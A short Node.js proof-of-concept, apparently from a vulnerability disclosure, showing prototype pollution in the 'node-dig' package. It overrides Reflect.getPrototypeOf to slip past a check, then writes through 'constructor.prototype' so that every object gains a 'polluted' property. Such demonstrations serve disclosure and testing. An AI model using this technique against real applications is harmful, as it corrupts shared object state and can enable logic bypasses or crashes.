Reflect.getPrototypeOf = () => false;
const nodeDig = require('node-dig');
console.log({}.polluted);
nodeDig({}, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);